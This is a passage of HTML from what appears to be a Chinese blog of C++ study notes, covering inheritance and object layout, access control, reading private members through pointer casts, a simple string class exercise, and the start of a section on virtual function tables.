class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Mankind</span>:Man</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> c;</span><br><span class=\"line\">\t<span class=\"type\">int</span> d;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">fun</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tMan n;</span><br><span class=\"line\">\tMankind m;</span><br><span class=\"line\"></span><br><span class=\"line\">\tMan* haha = &amp;m;</span><br><span class=\"line\">\tMankind* xixi = (Mankind*)&amp;n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">fun</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>多层继承时会计算所有成员变量的大小</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct A</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tint b;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct B:A</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint c;</span><br><span class=\"line\">\tint d;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct C:B</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint e;</span><br><span class=\"line\">\tint f;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">void fun()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tC c;</span><br><span class=\"line\">\tA* pa = &amp;c;</span><br><span class=\"line\">\tB* pb = &amp;c;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tsizeof(c);  //24</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct A</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tint b;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct B:A</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tint d;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct C:B</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint e;</span><br><span class=\"line\">\tint f;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">void fun()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tC c;</span><br><span class=\"line\">\tc.A::a = 1;</span><br><span class=\"line\">\tc.B::a = 2;</span><br><span class=\"line\">\t//不指定空间全部按照子类处理</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>多重继承</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct A</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tint b;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct B</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint c;</span><br><span class=\"line\">\tint d;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct C:A,B</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint e;</span><br><span class=\"line\">\tint f;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">sizeof()  //24</span><br></pre></td></tr></table></figure>\n<p>多重继承增加了程序的复杂度，容易出错</p>\n<p>微软建议使用单继承，如果需要多重继承可以改为多层继承</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230226151844722.png\" alt=\"image-20230226151844722\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230226152028331.png\" alt=\"image-20230226152028331\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct DateInfo</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint year;</span><br><span class=\"line\">\tint month;</span><br><span class=\"line\">\tint day;</span><br><span class=\"line\">\tDateInfo(int x, int y, int z)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tthis-&gt;year = x;</span><br><span class=\"line\">\t\tthis-&gt;month = y;</span><br><span class=\"line\">\t\tthis-&gt;day = z;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDateInfo()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tthis-&gt;year = 2015;</span><br><span class=\"line\">\t\tthis-&gt;month = 4;</span><br><span class=\"line\">\t\tthis-&gt;day = 2;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvoid SetDay(int day)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tthis-&gt;day = day;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tint GetDay()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tprintf(&quot;%d\\n&quot;, this-&gt;day);</span><br><span class=\"line\">\t\treturn this-&gt;day;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">struct TimeInfo:DateInfo</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint hours;</span><br><span class=\"line\">\tint minutes;</span><br><span class=\"line\">\tint seconds;</span><br><span class=\"line\">\tTimeInfo(int x, int y, int z)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tthis-&gt;hours = x;</span><br><span class=\"line\">\t\tthis-&gt;minutes = y;</span><br><span class=\"line\">\t\tthis-&gt;seconds = z;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tint GetHour()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; this-&gt;hours &lt;&lt; &quot; \\n&quot;;</span><br><span class=\"line\">\t\treturn this-&gt;hours;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">void func1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDateInfo d;</span><br><span class=\"line\">\tTimeInfo t(1,2,3);</span><br><span class=\"line\"></span><br><span class=\"line\">\tDateInfo* date = &amp;t;</span><br><span class=\"line\">\tTimeInfo* time = &amp;t;</span><br><span class=\"line\"></span><br><span class=\"line\">\tstd::cout &lt;&lt; date-&gt;day &lt;&lt; &quot; &quot; &lt;&lt; time-&gt;hours &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">struct MyString</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar* arr;</span><br><span class=\"line\">\tMyString()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tarr = (char*)malloc(1024);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tMyString(int length)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tarr = (char*)malloc(length);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t~MyString()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tfree(arr);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvoid SetString(char* str)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint i = 0;</span><br><span class=\"line\">\t\tint length = strlen(str);</span><br><span class=\"line\">\t\twhile(str[i] != 0 &amp;&amp; length&gt;0)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tarr[i] = str[i];</span><br><span class=\"line\">\t\t\ti++;</span><br><span class=\"line\">\t\t\tlength--;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tarr[i] = &#x27;\\0&#x27;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvoid PrintString()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tint i = 0;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\twhile(arr[i] != 0)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tprintf(&quot;%c&quot;, arr[i]);</span><br><span class=\"line\">\t\t\ti++;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tprintf(&quot;\\n&quot;,i);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvoid AppendString(char* str2)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstrcat(arr, str2);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tvoid Size()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tstd::cout &lt;&lt; strlen(arr) &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\tMyString string1;</span><br><span class=\"line\"></span><br><span class=\"line\">\tstring1.SetString(&quot;woshishabi&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstring1.PrintString();</span><br><span class=\"line\"></span><br><span class=\"line\">\tstring1.AppendString(&quot;haha&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstring1.PrintString();</span><br><span class=\"line\"></span><br><span class=\"line\">\tstring1.Size();</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tprintf(&quot;Hello World!\\n&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//formbase.h</span><br><span class=\"line\">class formbase</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\"></span><br><span class=\"line\">\tformbase();</span><br><span class=\"line\">\t~formbase();</span><br><span class=\"line\"></span><br><span class=\"line\">\tvoid fun1();</span><br><span class=\"line\">\tvoid fun2();</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">//formbase.cpp</span><br><span class=\"line\">#include &quot;formbase.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">formbase::formbase()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">formbase::~formbase()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void formbase::fun1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void formbase::fun2()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>1、xxx.h 只是一个文件，可以是任何的后缀名，如果你愿意，可以叫 xxx.exe</p>\n<p>2、#include 的作用只是把里面的内容复制过来仅此而已。如: #include “abc.exe”</p>\n<p>3、xxx.h 与 xxx.cpp 并不要求一定同名</p>\n<h3 id=\"权限控制\"><a class=\"markdownIt-Anchor\" href=\"#权限控制\">#</a> 权限控制</h3>\n<p>public 的意思是，这个成员哪里都可以用，不用担心被修改，所以，一旦发布成 public 的成员，是不能够改名字的.</p>\n<p>private 的意思是，这个成员只用于内部使用，不要在其他的地方使用.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct Person</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">private:</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\">private:</span><br><span class=\"line\">\tvoid fun1();</span><br><span class=\"line\">\tvoid fun2();</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>1、对外提供的函数或者变量，发布成 public 的但不能随意改动.</p>\n<p>2、可能会变动的函数或者变量，定义成 private 的这样编译器会在使用的时候做检测.</p>\n<p>3、只有结构体内部的函数才可以访问 private 的成员.</p>\n<p>4、public/private 可以修饰函数也可以修饰变量.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//通过指针强制访问private</span><br><span class=\"line\">void haha()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPerson p;</span><br><span class=\"line\">\tp.init(45, 67);</span><br><span class=\"line\">\tint* x = (int*)&amp;p;</span><br><span class=\"line\">\tint m = *(x + 0);</span><br><span class=\"line\">\tint n = *(x + 1);</span><br><span class=\"line\">\tstd::cout &lt;&lt; m &lt;&lt; &quot; &quot; &lt;&lt; n &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>struct 中默认全是 public</p>\n<p>class 中默认全是 private</p>\n<p><strong>class 继承时会将原来的 public 变为 private，如果想要保持 pubic，需要 <code>class Sub:public Person</code> </strong></p>\n<p>构造时先构造父类，在构造子类，因为需要继承构造之后的子类</p>\n<p>没有构造函数的时候系统会给一个默认的构造函数，</p>\n<p>public 继承会复制父类私有的成员，但无法直接使用，需要通过指针访问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class shabi</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tshabi()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\ta= 99;</span><br><span class=\"line\">\t\tb= 88;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">private:</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tint b;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">class zhizhang:public shabi</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tint x;</span><br><span class=\"line\">\tint y;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">void xixi()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tzhizhang zz;</span><br><span class=\"line\">\tzz.x = 77;</span><br><span class=\"line\">\tzz.y = 66;</span><br><span class=\"line\">\tint *q = (int*)&amp;zz;</span><br><span class=\"line\">\tstd::cout &lt;&lt; *(q+0) &lt;&lt; &quot; &quot; &lt;&lt; *(q+1) &lt;&lt; &quot; &quot; &lt;&lt; *(q+2) &lt;&lt; &quot; &quot; &lt;&lt; *(q+3) &lt;&lt; &quot; \\n&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//99 88 77 66 </span><br></pre></td></tr></table></figure>\n<p>将上一节课的所有练习改为 class 实现</p>\n<p>1、添加 private/public 进行权限控制.</p>\n<p>2、将类的定义与实现分开来写：定义写到 xxx.h 中函数实现写在 xx.x…cpp 中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//xixixi.h</span><br><span class=\"line\">class MyString</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tMyString();</span><br><span class=\"line\">\tMyString(int length);</span><br><span class=\"line\">\t~MyString();</span><br><span class=\"line\">private:</span><br><span class=\"line\">\tchar* arr;</span><br><span class=\"line\">public:</span><br><span class=\"line\">\tvoid SetString(char* str);</span><br><span class=\"line\">\tvoid PrintString();</span><br><span class=\"line\">\tvoid AppendString(char* str2);</span><br><span class=\"line\">\tvoid Size();</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">//xixixi.cpp</span><br><span class=\"line\">MyString::MyString()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tarr = (char*)malloc(1024);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">MyString::MyString(int length)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tarr = (char*)malloc(length);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">MyString::~MyString()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfree(arr);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void MyString::SetString(char* str)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int i = 0;</span><br><span class=\"line\">    int length = strlen(str);</span><br><span class=\"line\">    while(str[i] != 0 &amp;&amp; length&gt;0)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        arr[i] = str[i];</span><br><span class=\"line\">        i++;</span><br><span class=\"line\">        length--;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    arr[i] = &#x27;\\0&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void MyString::PrintString()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int i = 0;</span><br><span class=\"line\"></span><br><span class=\"line\">    while(arr[i] != 0)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        printf(&quot;%c&quot;, arr[i]);</span><br><span class=\"line\">        i++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    printf(&quot;\\n&quot;,i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void MyString::AppendString(char* str2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tstrcat(arr, str2);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void MyString::Size()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tstd::cout &lt;&lt; strlen(arr) &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\"></span><br><span class=\"line\">\tMyString string1;</span><br><span class=\"line\"></span><br><span class=\"line\">\tstring1.SetString(&quot;woshishabi&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstring1.PrintString();</span><br><span class=\"line\"></span><br><span class=\"line\">\tstring1.AppendString(&quot;haha&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstring1.PrintString();</span><br><span class=\"line\"></span><br><span class=\"line\">\tstring1.Size();</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tprintf(&quot;Hello World!\\n&quot;);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"虚函数表\"><a class=\"markdownIt-Anchor\" href=\"#虚函数表\">#</a> 虚函数表</h3>\n<p>直接调用和间接调用</p>\n<p>直接调用 call 地址 E8 …</p>\n<p>间接调用 call […]  FF 